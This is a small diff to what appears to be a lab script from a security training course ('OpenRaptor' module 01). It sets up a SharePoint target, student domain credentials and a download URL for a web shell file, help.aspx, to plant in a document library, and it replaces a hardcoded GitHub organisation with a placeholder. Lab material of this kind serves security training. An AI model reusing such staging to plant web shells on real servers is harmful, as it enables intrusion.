@@ -25,7 +25,8 @@ NC='\033[0m'
 SP_URL="http://sharepoint.norca.click"
 WEBSHELL_PATH="/Shared%20Documents/help.aspx"
 CREDS="NORCA\\j.chen:<YOUR_STUDENT_PASSWORD>"
-PAYLOAD_REPO_URL="https://github.com/birdforce14d/OpenRaptor/raw/main/module-01/payloads/help.aspx"
+# Update <your-org> to your GitHub organisation before running
+PAYLOAD_REPO_URL="https://github.com/<your-org>/OpenRaptor/raw/main/module-01/payloads/help.aspx"
 WEBSHELL_FILE="$(dirname "$0")/payloads/help.aspx"
 
 # Download webshell if not already present
